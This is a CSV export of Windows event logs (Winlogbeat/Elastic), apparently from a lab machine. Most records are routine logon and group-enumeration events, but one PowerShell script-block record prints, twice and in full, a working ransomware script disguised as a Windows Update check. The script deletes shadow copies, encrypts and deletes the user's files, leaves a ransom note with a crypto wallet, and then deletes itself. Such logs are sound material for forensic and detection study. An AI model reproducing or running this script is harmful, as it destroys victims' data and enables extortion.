	Logon ID:		0x3E7

Group:
	Security ID:		S-1-5-32-544
	Group Name:		Administrators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x94c
	Process Name:		C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","MANAGER$","-","-","-",WORKGROUP,"S-1-5-18","MANAGER$","MANAGER$","{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-",0x94c,"C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18",Builtin,"-","-","-","-","-","S-1-5-32-544",Administrators,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4799,"Audit Success","-","-","-",0x3e7,"-",Info,656,"1,100","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31200,"Security Group Management","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:46.566",AnkYBIQByII7dpeEPC54,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","user-member-enumerated",iam,4799,"Oct 23, 2022 @ 17:06:48.312","Oct 23, 2022 @ 17:06:48.047",event,success,"Microsoft-Windows-Security-Auditing","group, info","-","-","-","-","-",Builtin,"S-1-5-32-551","Backup Operators","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Group:
	Security ID:		S-1-5-32-551
	Group Name:		Backup Operators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x94c
	Process Name:		C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","MANAGER$","-","-","-",WORKGROUP,"S-1-5-18","MANAGER$","MANAGER$","{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-",0x94c,"C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18",Builtin,"-","-","-","-","-","S-1-5-32-551","Backup Operators","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4799,"Audit Success","-","-","-",0x3e7,"-",Info,656,"1,100","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31199,"Security Group Management","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:46.565",AXkYBIQByII7dpeEPC54,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","user-member-enumerated",iam,4799,"Oct 23, 2022 @ 17:06:48.312","Oct 23, 2022 @ 17:06:48.044",event,success,"Microsoft-Windows-Security-Auditing","group, info","-","-","-","-","-",Builtin,"S-1-5-32-544",Administrators,"x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Group:
	Security ID:		S-1-5-32-544
	Group Name:		Administrators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x94c
	Process Name:		C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","MANAGER$","-","-","-",WORKGROUP,"S-1-5-18","MANAGER$","MANAGER$","{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-",0x94c,"C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18",Builtin,"-","-","-","-","-","S-1-5-32-544",Administrators,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4799,"Audit Success","-","-","-",0x3e7,"-",Info,656,"1,100","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31198,"Security Group Management","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:46.559","_3kYBIQByII7dpeEPC14",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","user-member-enumerated",iam,4799,"Oct 23, 2022 @ 17:06:48.312","Oct 23, 2022 @ 17:06:48.039",event,success,"Microsoft-Windows-Security-Auditing","group, info","-","-","-","-","-",Builtin,"S-1-5-32-544",Administrators,"x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Group:
	Security ID:		S-1-5-32-544
	Group Name:		Administrators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x94c
	Process Name:		C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","MANAGER$","-","-","-",WORKGROUP,"S-1-5-18","MANAGER$","MANAGER$","{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-",0x94c,"C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18",Builtin,"-","-","-","-","-","S-1-5-32-544",Administrators,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4799,"Audit Success","-","-","-",0x3e7,"-",Info,656,"1,100","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31196,"Security Group Management","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:46.559",AHkYBIQByII7dpeEPC54,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","user-member-enumerated",iam,4799,"Oct 23, 2022 @ 17:06:48.312","Oct 23, 2022 @ 17:06:48.043",event,success,"Microsoft-Windows-Security-Auditing","group, info","-","-","-","-","-",Builtin,"S-1-5-32-551","Backup Operators","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"A security-enabled local group membership was enumerated.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Group:
	Security ID:		S-1-5-32-551
	Group Name:		Backup Operators
	Group Domain:		Builtin

Process Information:
	Process ID:		0x94c
	Process Name:		C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","MANAGER$","-","-","-",WORKGROUP,"S-1-5-18","MANAGER$","MANAGER$","{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-",0x94c,"C:\Windows\System32\VSSVC.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18",Builtin,"-","-","-","-","-","S-1-5-32-551","Backup Operators","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4799,"Audit Success","-","-","-",0x3e7,"-",Info,656,"1,100","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31197,"Security Group Management","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:46.541","_XkYBIQByII7dpeEPC14",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 17:06:48.312","Oct 23, 2022 @ 17:06:48.037",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x280
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",640,"-","SYSTEM, MANAGER$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,"1,100","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31194,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 17:06:46.541","_nkYBIQByII7dpeEPC14",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 17:06:48.312","Oct 23, 2022 @ 17:06:48.038",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,"1,100","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31195,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 17:06:46.427","_HkYBIQByII7dpeEPC14",".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:06:48.308","Oct 23, 2022 @ 17:06:48.035",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (1 of 1):
<# 
https://www.powershellgallery.com/packages/PSWindowsUpdate/2.2.0.3 
2nd most downloaded package  (last 6 weeks)
#>

# Variables
$Mode = ""-encrypt""
$OSVersion = [Environment]::OSVersion.Platform
if ($OSVersion -like ""*Win*"") {
    $Directory = $env:USERPROFILE
}
$PSRKey = """"
$slash = ""\""
$Readme = ""ransom_readme.txt""
$RansomUserPath = """"

function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param(
        [Parameter(Mandatory = $true)]
        [ValidateSet(""Encrypt"", ""Decrypt"")]
        [String]$Mode,
 
        [Parameter(Mandatory = $true)]
        [String]$Key,
 
        [Parameter(Mandatory = $true, ParameterSetName = ""CryptText"")]
        [String]$Text,
 
        [Parameter(Mandatory = $true, ParameterSetName = ""CryptFile"")]
        [String]$Path)
 
    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256 
    }
 
    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
        switch ($Mode) {
 
            ""Encrypt"" {
                if ($Text) { $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text) }
 
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) { break }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + "".canihelpyou"" 
                }
 
                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()
 
                if ($Text) { return [System.Convert]::ToBase64String($encryptedBytes) }
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                 (Get-Item $outPath).LastWriteTime = $File.LastWriteTime 
                }
            }
 
            ""Decrypt"" {
                if ($Text) { $cipherBytes = [System.Convert]::FromBase64String($Text) }
 
                if ($Path) {
                    $File = Get-Item -Path $Path <# -ErrorAction SilentlyContinue #>
                    if (!$File.FullName) { break }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName.replace("".canihelpyou"", """") 
                }
 
                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()
 
                if ($Text) { return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0) }
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                 (Get-Item $outPath).LastWriteTime = $File.LastWriteTime 
                }
            }
        }
    }
 
    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}

function CreateReadme {
    $ReadmeTXT = ""Your files have been encrypted!`nBut don't worry, you can still recover them with the recovery key :) if you pay `$1,000,000,000 in ETH to 0x8589427373D6D84E98730D7795D8f6f8731FDA16`n""
    if (!(Test-Path ""$Directory$slash$Readme"")) {
        Add-Content -Path ""$Directory$slash$Readme"" -Value $ReadmeTXT 
        Add-Content -Path ""$Directory$slash$Readme"" -Value ""Recovery Key: $PSRKey `n"" 
    }
}
    
function EncryptFiles {
    $ExcludedFilesDirectories = 'C:\Users\UserManager.ps1', 'C:\Users\system.log', 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\SystemInit.cmd', 'C:\Users\system.conf', '*.canihelpyou', 'ransom_readme.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'
    foreach ($i in $(Get-ChildItem $Directory -Attributes !System -Exclude $ExcludedFilesDirectories -Recurse | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { 
        # Don't encrypt the ransomware first if it is in user folder
        if ($i -ne $PSCommandPath) {
            Invoke-AESEncryption -Mode Encrypt -Key $PSRKey -Path $i
        } else {
            $RansomUserPath = $i
        }
        Remove-Item $i 
    }
}

function DeleteShadows {
    # Requires administrator privileges
    Get-CimInstance Win32_ShadowCopy | Remove-CimInstance
}

function DecryptFiles {
    foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.canihelpyou | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
        Invoke-AESEncryption -Mode Decrypt -Key $PSRKey -Path $i ; $rfile = $i.replace("".canihelpyou"", """")
        Write-Host ""[+] $rfile is now decrypted"" -ForegroundColor Cyan 
    } ; Remove-Item ""$Directory$slash$Readme"" 
}

function CheckFiles { 
    $RFiles = Get-ChildItem $Directory  -Attributes !System -Recurse -filter *.canihelpyou ; if ($RFiles) { $RFiles | Remove-Item } else {
        Write-Host ""[!] No encrypted files has been found!"" -ForegroundColor Red 
    }
}

if ($Mode -eq ""-decrypt"") { 
    Write-Host ; Write-Host ""[!] Recovering ransomware infection on $DirectoryTarget directory.."" -ForegroundColor Red
    Write-Host ""[i] Applying recovery key on encrypted files.."" -ForegroundColor Green
    DecryptFiles ; CheckFiles
}
  
else {
    Write-Host ; Write-Host ""Checking for Windows updates via Windows Update Client..."" -ForegroundColor Cyan
    if ($OSVersion -like ""*Win*"") {
        DeleteShadows
    }
    $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | ForEach-Object { [char]$_ })
    Start-Sleep 1
    Write-Host ""Checking file hashes for Windows updates..."" -ForegroundColor Cyan
    CreateReadme
    EncryptFiles
    Start-Sleep 1

    Write-Host ""Saving Windows update status..."" -ForegroundColor Cyan
    Start-Sleep 2
    Write-Host ""Completed. No Windows updates were found."" -ForegroundColor Green
    # Self Delete
    if ($PSCommandPath -ne """") {
        rm $PSCommandPath -Force
    }
}

ScriptBlock ID: ff24e631-53e1-414f-8dd6-79d3027f1aa5
Path: ","ff24e631-53e1-414f-8dd6-79d3027f1aa5","<# 
https://www.powershellgallery.com/packages/PSWindowsUpdate/2.2.0.3 
2nd most downloaded package  (last 6 weeks)
#>

# Variables
$Mode = ""-encrypt""
$OSVersion = [Environment]::OSVersion.Platform
if ($OSVersion -like ""*Win*"") {
    $Directory = $env:USERPROFILE
}
$PSRKey = """"
$slash = ""\""
$Readme = ""ransom_readme.txt""
$RansomUserPath = """"

function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param(
        [Parameter(Mandatory = $true)]
        [ValidateSet(""Encrypt"", ""Decrypt"")]
        [String]$Mode,
 
        [Parameter(Mandatory = $true)]
        [String]$Key,
 
        [Parameter(Mandatory = $true, ParameterSetName = ""CryptText"")]
        [String]$Text,
 
        [Parameter(Mandatory = $true, ParameterSetName = ""CryptFile"")]
        [String]$Path)
 
    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256 
    }
 
    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
        switch ($Mode) {
 
            ""Encrypt"" {
                if ($Text) { $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text) }
 
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) { break }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + "".canihelpyou"" 
                }
 
                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()
 
                if ($Text) { return [System.Convert]::ToBase64String($encryptedBytes) }
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                 (Get-Item $outPath).LastWriteTime = $File.LastWriteTime 
                }
            }
 
            ""Decrypt"" {
                if ($Text) { $cipherBytes = [System.Convert]::FromBase64String($Text) }
 
                if ($Path) {
                    $File = Get-Item -Path $Path <# -ErrorAction SilentlyContinue #>
                    if (!$File.FullName) { break }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName.replace("".canihelpyou"", """") 
                }
 
                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()
 
                if ($Text) { return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0) }
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                 (Get-Item $outPath).LastWriteTime = $File.LastWriteTime 
                }
            }
        }
    }
 
    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}

function CreateReadme {
    $ReadmeTXT = ""Your files have been encrypted!`nBut don't worry, you can still recover them with the recovery key :) if you pay `$1,000,000,000 in ETH to 0x8589427373D6D84E98730D7795D8f6f8731FDA16`n""
    if (!(Test-Path ""$Directory$slash$Readme"")) {
        Add-Content -Path ""$Directory$slash$Readme"" -Value $ReadmeTXT 
        Add-Content -Path ""$Directory$slash$Readme"" -Value ""Recovery Key: $PSRKey `n"" 
    }
}
    
function EncryptFiles {
    $ExcludedFilesDirectories = 'C:\Users\UserManager.ps1', 'C:\Users\system.log', 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\SystemInit.cmd', 'C:\Users\system.conf', '*.canihelpyou', 'ransom_readme.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'
    foreach ($i in $(Get-ChildItem $Directory -Attributes !System -Exclude $ExcludedFilesDirectories -Recurse | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { 
        # Don't encrypt the ransomware first if it is in user folder
        if ($i -ne $PSCommandPath) {
            Invoke-AESEncryption -Mode Encrypt -Key $PSRKey -Path $i
        } else {
            $RansomUserPath = $i
        }
        Remove-Item $i 
    }
}

function DeleteShadows {
    # Requires administrator privileges
    Get-CimInstance Win32_ShadowCopy | Remove-CimInstance
}

function DecryptFiles {
    foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.canihelpyou | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {
        Invoke-AESEncryption -Mode Decrypt -Key $PSRKey -Path $i ; $rfile = $i.replace("".canihelpyou"", """")
        Write-Host ""[+] $rfile is now decrypted"" -ForegroundColor Cyan 
    } ; Remove-Item ""$Directory$slash$Readme"" 
}

function CheckFiles { 
    $RFiles = Get-ChildItem $Directory  -Attributes !System -Recurse -filter *.canihelpyou ; if ($RFiles) { $RFiles | Remove-Item } else {
        Write-Host ""[!] No encrypted files has been found!"" -ForegroundColor Red 
    }
}

if ($Mode -eq ""-decrypt"") { 
    Write-Host ; Write-Host ""[!] Recovering ransomware infection on $DirectoryTarget directory.."" -ForegroundColor Red
    Write-Host ""[i] Applying recovery key on encrypted files.."" -ForegroundColor Green
    DecryptFiles ; CheckFiles
}
  
else {
    Write-Host ; Write-Host ""Checking for Windows updates via Windows Update Client..."" -ForegroundColor Cyan
    if ($OSVersion -like ""*Win*"") {
        DeleteShadows
    }
    $PSRKey = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | ForEach-Object { [char]$_ })
    Start-Sleep 1
    Write-Host ""Checking file hashes for Windows updates..."" -ForegroundColor Cyan
    CreateReadme
    EncryptFiles
    Start-Sleep 1

    Write-Host ""Saving Windows update status..."" -ForegroundColor Cyan
    Start-Sleep 2
    Write-Host ""Completed. No Windows updates were found."" -ForegroundColor Green
    # Self Delete
    if ($PSCommandPath -ne """") {
        rm $PSCommandPath -Force
    }
}",1,1,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-18","-","-","{218ecdf5-e63b-0001-f347-8f213be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","2,464",896,"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",5130,"Execute a Remote Command","NT AUTHORITY","S-1-5-18",SYSTEM,User,1
"Oct 23, 2022 @ 17:06:22.919",Z3kXBIQByII7dpeE3S0z,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",16384,"Oct 23, 2022 @ 17:06:23.937","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Successfully scheduled Software Protection service for re-start at 2022-11-22T04:28:22Z. Reason: RulesEngine.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","2022-11-22T04:28:22Z","-","-","-","-",RulesEngine,"-","-","-","-","-","-","-","-","-","-",16384,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",4780,"-","-","-","-","-","-"
